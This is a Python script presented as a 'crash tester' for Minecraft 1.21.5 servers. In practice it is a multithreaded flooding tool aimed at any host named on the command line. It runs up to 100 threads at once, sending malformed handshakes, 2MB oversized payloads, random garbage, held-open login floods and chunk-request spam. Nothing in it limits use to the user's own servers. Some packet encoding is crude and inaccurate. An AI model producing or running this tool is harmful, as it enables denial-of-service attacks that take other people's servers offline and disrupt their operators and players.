import socket
import threading
import random
import time
from struct import pack

class MinecraftCrashTester:
    def __init__(self, host, port=25565, max_threads=100):
        self.host = host
        self.port = port
        self.max_threads = max_threads
        self.running = False
        self.attack_methods = [
            self._send_invalid_handshake,
            self._send_oversized_packet,
            self._send_random_garbage,
            self._send_login_flood,
            self._send_chunk_spam
        ]
    
    def start_test(self, duration=60):
        """Start the crash test for specified duration (seconds)"""
        self.running = True
        threads = []
        start_time = time.time()
        
        print(f"Starting crash test on {self.host}:{self.port} for {duration} seconds")
        
        try:
            while self.running and (time.time() - start_time) < duration:
                if len(threads) < self.max_threads:
                    method = random.choice(self.attack_methods)
                    t = threading.Thread(target=method)
                    t.daemon = True
                    t.start()
                    threads.append(t)
                
                # Clean up finished threads
                threads = [t for t in threads if t.is_alive()]
                time.sleep(0.01)
            
            self.running = False
            for t in threads:
                t.join(timeout=1)
            
            print("Crash test completed")
        except KeyboardInterrupt:
            self.running = False
            print("\nTest stopped by user")
    
    def _create_socket(self):
        """Create a new socket connection"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.host, self.port))
            return s
        except Exception as e:
            #print(f"Connection failed: {e}")
            return None
    
    def _send_invalid_handshake(self):
        """Send invalid handshake packet"""
        s = self._create_socket()
        if s:
            try:
                # Invalid protocol version (-1) and wrong state
                packet = pack('>B', 0x00)  # Handshake packet ID
                packet += pack('>B', 0xFE)  # Invalid protocol version (part 1)
                packet += pack('>B', 0xFF)  # Invalid protocol version (part 2)
                packet += pack('>B', 0xFF)  # Invalid protocol version (part 3)
                packet += pack('>B', 0xFF)  # Invalid protocol version (part 4)
                packet += pack('>B', 0x0F)   # Invalid hostname length
                packet += b'localhost'       # Hostname
                packet += pack('>H', 25565)  # Port
                packet += pack('>B', 0x02)   # Invalid next state
                
                s.send(packet)
                time.sleep(0.1)
                s.close()
            except:
                pass
    
    def _send_oversized_packet(self):
        """Send an oversized packet to test buffer limits"""
        s = self._create_socket()
        if s:
            try:
                # Create a very large packet (2MB)
                large_data = b'\x00' * (2 * 1024 * 1024)
                s.send(large_data)
                time.sleep(0.1)
                s.close()
            except:
                pass
    
    def _send_random_garbage(self):
        """Send random garbage data"""
        s = self._create_socket()
        if s:
            try:
                garbage = bytes([random.randint(0, 255) for _ in range(1024)])
                s.send(garbage)
                time.sleep(0.1)
                s.close()
            except:
                pass
    
    def _send_login_flood(self):
        """Flood with login requests"""
        s = self._create_socket()
        if s:
            try:
                # Send handshake
                handshake = pack('>B', 0x00)  # Packet ID
                handshake += pack('>B', 0x04)  # Protocol version (part)
                handshake += pack('>B', len(self.host)) + self.host.encode()
                handshake += pack('>H', self.port)
                handshake += pack('>B', 0x02)  # Login state
                s.send(handshake)
                
                # Send login start
                login_start = pack('>B', 0x00)  # Login start packet ID
                login_start += pack('>B', 0x08) + b'CrashTest'
                s.send(login_start)
                
                # Keep connection open
                time.sleep(5)
                s.close()
            except:
                pass
    
    def _send_chunk_spam(self):
        """Simulate chunk spam (if we get past login)"""
        s = self._create_socket()
        if s and self._perform_handshake(s):
            try:
                for _ in range(100):  # Send 100 chunk requests
                    chunk_packet = pack('>B', 0x22)  # Chunk packet ID (example)
                    chunk_packet += pack('>i', random.randint(-100000, 100000))  # X
                    chunk_packet += pack('>i', random.randint(-100000, 100000))  # Z
                    s.send(chunk_packet)
                    time.sleep(0.01)
                s.close()
            except:
                pass
    
    def _perform_handshake(self, s):
        """Perform proper handshake to get to play state"""
        try:
            # Handshake
            handshake = pack('>B', 0x00)  # Packet ID
            handshake += pack('>B', 0x04)  # Protocol version (part)
            handshake += pack('>B', len(self.host)) + self.host.encode()
            handshake += pack('>H', self.port)
            handshake += pack('>B', 0x02)  # Login state
            s.send(handshake)
            
            # Login start
            login_start = pack('>B', 0x00) + pack('>B', 0x08) + b'CrashTest'
            s.send(login_start)
            
            return True
        except:
            return False

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Minecraft 1.21.5 Server Crash Tester')
    parser.add_argument('host', help='Minecraft server hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=25565, help='Server port (default: 25565)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Max concurrent threads (default: 100)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Test duration in seconds (default: 60)')
    
    args = parser.parse_args()
    
    tester = MinecraftCrashTester(args.host, args.port, args.threads)
    tester.start_test(args.duration)